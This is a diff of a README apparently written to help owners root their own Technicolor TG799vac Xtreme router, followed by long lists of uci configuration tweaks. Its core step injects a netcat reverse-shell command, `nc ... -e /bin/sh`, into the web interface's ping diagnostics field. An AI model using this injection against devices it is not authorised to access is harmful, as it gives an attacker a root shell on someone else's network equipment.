@@ -28,25 +28,26 @@ is hacking their
 
 # HOWTO
 
-#### Set up a netcat listener on your machine, and adjust any firewall rules to allow an inbound connection:
+###### Set up a netcat listener on your machine, and adjust any firewall rules to allow an inbound connection:
 
     nc -lvvp [machine_port]
 
  ![Screenshot](files/tg799vac-xtreme-1.png)
 
-#### Go to the ping/traceroute diagnostics page in the gateway’s web management, and enter the following:
+###### Go to the ping/traceroute diagnostics page in the gateway’s web management, and enter the following:
 
     :::::::`nc [machine_IP] [machine_port] -e /bin/sh`
 
-## Here i providing a picture aswell: 
+##### Here i providing a picture aswell: 
 
 ![Screenshot](files/tg799vac-xtreme-2.png)
 
-## You should see it like this now:
+##### You should see it like this now:
 
 ![Screenshot](files/tg799vac-xtreme-3.png)
 
-### Set your password and then copy / paste:
+###### Set your password and then copy / paste:
+###### After you paste this you will have new settings in http://192.168.1.1
 
     uci add_list web.assistancemodal.roles='admin' 
     uci add_list web.usermgrmodal.roles='admin'
@@ -63,33 +64,27 @@ is hacking their
     sed -i s/'131.116.22.242'/'xx.xx.xx.xx'/g /etc/config/dropbear 
     OBS!! THIS IS A BACKDOOR > Please go whois the ip to witness it yourself 
     # This backdoor is for **ALL** people who works for Technicolor Technologies in Belgium!! **As if we can know if this is abused?**
-
     sed -i s/'82.146.125.0'/'xx.xx.xx.xx'/g /etc/config/dropbear 
-
     sed -i '1,18 s/^/#/' /etc/config/dropbear
     sed -i '20s/off/on/' /etc/config/dropbear 
     sed -i '21s/off/on/' /etc/config/dropbear
     sed -i '24s/0/1/' /etc/config/dropbear
     sed -i '25s/0/1/' /etc/config/dropbear
     /etc/init.d/nginx restart
-    
-##### Above commands gave you 10 new settings in web interface
-
-##### Please go and witness it on http://dlsdevice.lan 
-
+  
    Let me provide the default view to see the difference before and after we run these commands
    since I know that there are people who are paranoid for changes due to root. ;)
    The firmware has been **extremely** downgraded to the worse for us consumers.
 
-### Default settings for Telia web-interface looks like this:
+###### Default settings for Telia web-interface looks like this:
 
 ![Screenshot](files/tg799vac-xtreme-4.png)
 
-### This is how it looks after we run these commands above:
+###### This is how it looks after we run these commands above:
 
 ![Screenshot](files/tg799vac-xtreme-5.png)
 
-##### RULES
+###### RULES
 
     uci add_list web.ruleset_main.rules=cwmpconfmodal
     uci add_list web.ruleset_main.rules=mmpbxinoutgoingmapmodal
@@ -163,12 +158,162 @@ is hacking their
     uci set hotspotd.main.enable=false
     uci set hotspotd.main.deploy=false
 
-#### Install ipk packages with a working opkg.conf.
-#### Then Follow This Video I Made For You ;)
+##### Add/Delete ADSL profiles and modes
+
+    uci del_list xdsl.dsl0.profile='8a'
+    uci del_list xdsl.dsl0.profile='8b'
+    uci del_list xdsl.dsl0.profile='8c'
+    uci del_list xdsl.dsl0.profile='8d'
+    uci del_list xdsl.dsl0.profile='12a'
+    uci del_list xdsl.dsl0.profile='12b'
+    uci del_list xdsl.dsl0.multimode='gdmt'
+    uci del_list xdsl.dsl0.multimode='adsl2annexm'
+    uci del_list xdsl.dsl0.multimode='adsl2plus'
+
+    
+###### Changing max sync speed
+
+    uci set xdsl.dsl0.maxaggrdatarate='200000' # 16000 default
+    uci set xdsl.dsl0.maxdsdatarate='140000'   # 11000 default
+    uci set xdsl.dsl0.maxusdatarate='60000'    # 40000 default
+   
+###### Enable/Disable WIFI
+
+    uci set wireless.radio_2G.state='0'
+    uci set wireless.radio_5G.state='0'
+
+###### Enable/Disable dnsmasq as all interfaces are ignored now
+ 
+    uci show dhcp.lan.ignore='1'
+
+###### Enable/Disable network time server
+
+    uci set system.ntp.enable_server='0'
+    uci commit
+    
+###### Enable/Disable IGMP Proxy:
+
+    /etc/init.d/igmpproxy stop
+    /etc/init.d/igmpproxy disable
+
+###### Using bridge mode with a dedicated PPPoE ethernet port:
+  
+    uci set network.lan.dns='8.8.8.8'
+    uci set network.lan.gateway='192.168.0.254'
+    uci set mmpbxrvsipnet.sip_net.interface='lan'
+    uci set mmpbxrvsipnet.sip_net.interface6='lan6'
+    uci commit
+
+###### You can check the current running dns with:
+
+    cat /etc/resolv.conf
+    
+###### Edit nsplink to something else (where you get redirected when you click on the logo at top) 
+
+    uci set web.uidefault.nsplink='https://sendit.nu'
+
+###### This will show all ip connected to your router atm..
+
+    netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u  
+     
+###### Disable WWAN support (mobiled)
+
+     uci set mobiled.globals.enabled='0'
+     uci set mobiled.device_defaults.enabled='0'
+     uci commit
+     /etc/init.d/mobiled stop
+     /etc/init.d/mobiled disable
+     
+###### Disable Content Sharing (Samba / DNLA)
+
+     uci set samba.samba.enabled='0'
+     /etc/init.d/samba stop
+     /etc/init.d/samba disable
+     /etc/init.d/samba-nmbd stop
+     /etc/init.d/samba-nmbd disable
+     uci set dlnad.config.enabled='0'
+     uci commit
+     
+     /etc/init.d/dlnad stop
+     /etc/init.d/dlnad disable
+     
+###### To view currently dhcp leases:
+
+     cat /tmp/dhcp.leases
+     1534969000 macaddr lanip machine macaddr
+     
+###### To view arp log
+ 
+     cat /tmp/arp.log
+     root@OpenWrt:/tmp# cat /tmp/arp.log 
+     IP address       HW type     Flags       HW address            Mask     Device
+     lanip            0x1         0x2         X0:X0:X0:X0:X0:X0      *        br-lan
+     mgmt_ip          0x1         0x2         X0:X0:X0:X0:X0:X0     *        vlan_mgmt
+     wanip            0x1         0x2         X0:X0:X0:X0:X0:X0     *        eth4
+     
+###### List mac-addr.
+
+    ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//
+    eth0      X0:X0:X0:X0:X0:X0  
+    eth1      X0:X0:X0:X0:X0:X0 
+    eth2      X0:X0:X0:X0:X0:X0  
+    eth3      X0:X0:X0:X0:X0:X0 
+    eth4      X0:X0:X0:X0:X0:X0 
+    eth5      X0:X0:X0:X0:X0:X0 
+    vlan_eth0 X0:X0:X0:X0:X0:X0 
+    vlan_eth1 X0:X0:X0:X0:X0:X0  
+    vlan_eth2 X0:X0:X0:X0:X0:X0   
+    vlan_eth3 X0:X0:X0:X0:X0:X0  
+    vlan_eth5 X0:X0:X0:X0:X0:X0 
+    wl0       X0:X0:X0:X0:X0:X0 
+    wl0_1     X0:X0:X0:X0:X0:X0   
+    wl0_2     X0:X0:X0:X0:X0:X0  
+   
+###### Disable Monitor Of Traffic
+
+     uci set system.@trafficmon[0].interface=''
+     uci set system.@trafficmon[0].minute=''
+     uci set system.@trafficmon[1].interface=''
+     uci set system.@trafficmon[1].minute=''
+     uci set system.@trafficmon[2].interface=''
+     uci set system.@trafficmon[2].minute=''
+     uci set system.@trafficmon[3]=trafficmon
+     uci set system.@trafficmon[3].interface=''
+     uci set system.@trafficmon[3].minute=''
+
+###### This Is A Random Example Preview For Disable Monitor Of Traffic
+
+![Screenshot](files/tg799vac-xtreme-10.gif)
+
+###### Disable Time of Day ACL rules
+
+     uci set tod.global.enabled='0'
+     uci commit
+
+     /etc/init.d/tod stop
+     /etc/init.d/tod disable
+      
+###### For login with debug mode enabled, then please go to (Proably not possible):
+     
+     http://192.168.1.1/?debug=1
+     
+###### Mount / as read and write
+
+    mount -o remount,rw /
+
+###### Disable so your router wont restart if there is an segmentation fault in a user space program.
+
+    uci set system.@coredump[0].reboot='0'
+    uci commit system
+ 
+   
+   
+###### Install ipk packages with a working opkg.conf.
+###### Then Follow This Video I Made For You ;)
 
 ![Screenshots](files/tg799vac-xtreme13.gif)
 
-### Now go install a package, let me show an example how-to install wget:
+###### Now go install a package, let me show an example how-to install wget:
     
     opkg install wget
     Installing wget (1.13.4-1) to root...
@@ -176,7 +321,7 @@ is hacking their
     Multiple packages (librt and librt) providing same name marked HOLD or PREFER. Using latest.
     Configuring wget.
     
-#### List URLs for firmware that can be downloaded.
+###### List URLs for firmware that can be downloaded.
 
      strings /etc/cwmpd.db 
 
@@ -211,183 +356,8 @@ is hacking their
     transfera PasswordV
     ...........
     
-#### Add/Delete ADSL profiles and modes
 
-    uci del_list xdsl.dsl0.profile='8a'
-    uci del_list xdsl.dsl0.profile='8b'
-    uci del_list xdsl.dsl0.profile='8c'
-    uci del_list xdsl.dsl0.profile='8d'
-    uci del_list xdsl.dsl0.profile='12a'
-    uci del_list xdsl.dsl0.profile='12b'
-    uci del_list xdsl.dsl0.multimode='gdmt'
-    uci del_list xdsl.dsl0.multimode='adsl2annexm'
-    uci del_list xdsl.dsl0.multimode='adsl2plus'
-
-    
-#### Changing max sync speed
-
-    uci set xdsl.dsl0.maxaggrdatarate='200000' # 16000 default
-    uci set xdsl.dsl0.maxdsdatarate='140000'   # 11000 default
-    uci set xdsl.dsl0.maxusdatarate='60000'    # 40000 default
-    uci commit xdsl
-    reboot
-   
-##### Enable/Disable WIFI
-
-    uci set wireless.radio_2G.state='0'
-    uci set wireless.radio_5G.state='0'
-    uci commit
-
-##### Enable/Disable ODHCP services
-
-    /etc/init.d/odhcpd stop
-    /etc/init.d/odhcpd disable
-
-##### Enable/Disable dnsmasq as all interfaces are ignored now
- 
-    uci show dhcp.lan.ignore='1'
-    /etc/init.d/dnsmasq stop
-    /etc/init.d/dnsmasq disable
-
-##### Enable/Disable network time server
-
-    uci set system.ntp.enable_server='0'
-    uci commit
-    
-##### Enable/Disable IGMP Proxy:
-
-    /etc/init.d/igmpproxy stop
-    /etc/init.d/igmpproxy disable
-
-#### Using bridge mode with a dedicated PPPoE ethernet port:
-  
-    uci set network.lan.dns='8.8.8.8'
-    uci set network.lan.gateway='192.168.0.254'
-    uci set mmpbxrvsipnet.sip_net.interface='lan'
-    uci set mmpbxrvsipnet.sip_net.interface6='lan6'
-    uci commit
-
-#### You can check the current running dns with:
-
-    cat /etc/resolv.conf
-    
-#### Edit nsplink to something else (where you get redirected when you click on the logo at top) 
-
-    uci set web.uidefault.nsplink='https://sendit.nu'
-
-#### This will show all ip connected to your router atm..
-
-    netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u  
-
-#### Enable web interface features in Bridge Mode
-    If you have the modem in bridge mode, the web interface is gutted compared to in routed mode.
-    Edit /www/lua/cards_limiter.lua and change the following function to:
-   
-    'function M.card_limited(info, cardname)
-     return false
-     if info.bridged then
-     return not bridge_limit_list[cardname]
-     end
-     return false
-     end
-     /etc/init.d/nginx restart
-     
-#### Disable WWAN support (mobiled)
-
-     uci set mobiled.globals.enabled='0'
-     uci set mobiled.device_defaults.enabled='0'
-     uci commit
-     /etc/init.d/mobiled stop
-     /etc/init.d/mobiled disable
-     
-#### Disable Content Sharing (Samba / DNLA)
-
-     uci set samba.samba.enabled='0'
-     /etc/init.d/samba stop
-     /etc/init.d/samba disable
-     /etc/init.d/samba-nmbd stop
-     /etc/init.d/samba-nmbd disable
-     uci set dlnad.config.enabled='0'
-     uci commit
-     
-     /etc/init.d/dlnad stop
-     /etc/init.d/dlnad disable
-     
-#### To view currently dhcp leases:
-
-     cat /tmp/dhcp.leases
-     1534969000 macaddr lanip machine macaddr
-     
-#### To view arp log
- 
-     cat /tmp/arp.log
-     root@OpenWrt:/tmp# cat /tmp/arp.log 
-     IP address       HW type     Flags       HW address            Mask     Device
-     lanip            0x1         0x2         X0:X0:X0:X0:X0:X0      *        br-lan
-     mgmt_ip          0x1         0x2         X0:X0:X0:X0:X0:X0     *        vlan_mgmt
-     wanip            0x1         0x2         X0:X0:X0:X0:X0:X0     *        eth4
-     
-#### List mac-addr.
-
-    ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//
-    eth0      X0:X0:X0:X0:X0:X0  
-    eth1      X0:X0:X0:X0:X0:X0 
-    eth2      X0:X0:X0:X0:X0:X0  
-    eth3      X0:X0:X0:X0:X0:X0 
-    eth4      X0:X0:X0:X0:X0:X0 
-    eth5      X0:X0:X0:X0:X0:X0 
-    vlan_eth0 X0:X0:X0:X0:X0:X0 
-    vlan_eth1 X0:X0:X0:X0:X0:X0  
-    vlan_eth2 X0:X0:X0:X0:X0:X0   
-    vlan_eth3 X0:X0:X0:X0:X0:X0  
-    vlan_eth5 X0:X0:X0:X0:X0:X0 
-    wl0       X0:X0:X0:X0:X0:X0 
-    wl0_1     X0:X0:X0:X0:X0:X0   
-    wl0_2     X0:X0:X0:X0:X0:X0  
-   
-#### Disable Monitor Of Traffic
-
-     uci set system.@trafficmon[0].interface=''
-     uci set system.@trafficmon[0].minute=''
-     uci set system.@trafficmon[1].interface=''
-     uci set system.@trafficmon[1].minute=''
-     uci set system.@trafficmon[2].interface=''
-     uci set system.@trafficmon[2].minute=''
-     uci set system.@trafficmon[3]=trafficmon
-     uci set system.@trafficmon[3].interface=''
-     uci set system.@trafficmon[3].minute=''
-
-**Random Example Preview For Disable Monitor Of Traffic**
-
-![Screenshot](files/tg799vac-xtreme-10.gif)
-
-#### Disable Time of Day ACL rules
-
-     uci set tod.global.enabled='0'
-     uci commit
-
-     /etc/init.d/tod stop
-     /etc/init.d/tod disable
-      
-#### For login with debug mode enabled, then please go to:
-     
-     http://192.168.1.1/?debug=1
-     
-#### Mount / as read and write
-
-    mount -o remount,rw /
-
-#### Disable so your router wont restart if there is an segmentation fault in a user space program.
-
-    uci set system.@coredump[0].reboot='0'
-    uci commit system
-
-#### Get permananent root access
-
-    Modifying the /etc/inittab file by type
-    sed -i '3s/^.//g' /etc/inittab
-   
-#### Enable bridged mode from /etc/config/network
+###### Enable bridged mode from /etc/config/network
 
 You can copy paste everything from below the video if you are lazy.
 
@@ -415,40 +385,36 @@ You can copy paste everything from below the video if you are lazy.
     list ifname 'wl1'
     list ifname 'wk1_1'
 
-## Tired on passwords and want to use dropbear key for login instead? Then do: 
+##### Tired on passwords and want to use dropbear key for login instead? Then do: 
 
-#### Generate the Key Pair on your pc (not router):
+###### Generate the Key Pair on your pc (not router):
 
      ssh-keygen -t dsa
 
-#### Next copy the public key with SCP to OpenWrt:
+###### Next copy the public key with SCP to OpenWrt:
    
     scp ~/.ssh/id_dsa.pub root@192.168.1.1:/tmp
 
-#### Now connect to your router.
-#### Add the public key to the authorized_keys from ~/.ssh/id_dsa.pub
+###### Now connect to your router.
+###### Add the public key to the authorized_keys from ~/.ssh/id_dsa.pub
 
      cd /etc/dropbear
      cat /tmp/id_*.pub >> authorized_keys
      chmod 0600 authorized_keys
      exit
   
-#### Disconnect from your router and type following on your pc:
+###### Disconnect from your router and type following on your pc:
    
      ssh root@192.168.1.1 "tee -a /etc/dropbear/authorized_keys" < ~/.ssh/id_rsa.pub
      
-#### Now connect to your router without any password required:
+###### Now connect to your router without any password required:
    
      ssh root@192.168.1.1
    
    ![Screenshot](files/tg799vac-xtreme-6.png)
 
-#### Serial Console
 
-    /etc/initd
-    #ttyS0::askfirst:/bin/login
-
-# Want get rid of the default layout?
+## Want get rid of the default layout?
 
    Then we has to edit the CSS files.
    I wont go though every color since its a huge job and really boring since telia 
@@ -463,31 +429,31 @@ You can copy paste everything from below the video if you are lazy.
    If you want to use 'theme wuseman' on your technicolor tg799-vac xtreme
    router then copy & paste my commands below the previews: (or download my css files and scp them over to router)
 
-#### Login page:
+###### Login page:
 
 ![Screenshot](files/tg799vac-xtreme-7.png)
 
-#### Once you've logged in, it looks like this:
+###### Once you've logged in, it looks like this:
 
 ![Screenshot](files/tg799vac-xtreme-8.png)
 
-#### This is my personal theme from a mobile device:
+###### This is my personal theme from a mobile device:
 
 ![Screenshot](files/tg799vac-xtreme-9.png)
 
-#### This is my personal theme from a pc device:
+###### This is my personal theme from a pc device:
 
 ![Screenshot](files/tg799vac-xtreme-10.png)
 
-#### A failed login attempt as user 'telia' or 'assist' (ofc, all usernames will be logged) will be reported from now since they dont have permissions to login if i didnt requested support from them:
+###### A failed login attempt as user 'telia' or 'assist' (ofc, all usernames will be logged) will be reported from now since they dont have permissions to login if i didnt requested support from them:
 
 ![Screenshot](files/tg799vac-xtreme-11.png)
 
-#### We can see failed login attempts in the system log for both telnet, ssh and the web:
+###### We can see failed login attempts in the system log for both telnet, ssh and the web:
 
 ![Screenshot](files/tg799vac-xtreme-12.png)
 
-#### To get colors as above, paste following in router shell: 
+###### To get colors as above, paste following in router shell: 
 
     sed -i s/'333333'/'e6e6e6'/g gw.css; sed -i s/'333333'/'e6e6e6'/g responsive.css; sed -i s/'333333'/'e6e6e6'/g lte-doctor.css; 
     sed -i s/'333333'/'e6e6e6'/g chosen.css; sed -i s/'333333'/'e6e6e6'/g mobiled.css; sed -i s/'990ae3'/'55aa7f'/g gw.css; 
@@ -520,7 +486,7 @@ You can copy paste everything from below the video if you are lazy.
     sed -i s/'d9d9d9'/'222222'/g lte-doctor.css; sed -i s/'d9d9d9'/'222222'/g chosen.css; sed -i s/'0088cc'/'#5ebe8d'/g responsive.css; 
     sed -i s/'0088cc'/'#5ebe8d'/g lte-doctor.css; sed -i s/'0088cc'/'#5ebe8d'/g chosen.css
 
-##### Have fun and be careful with other settings not provided by me! ;)
+###### Have fun and be careful with other settings not provided by me! ;)
 
 
 # CONTACT
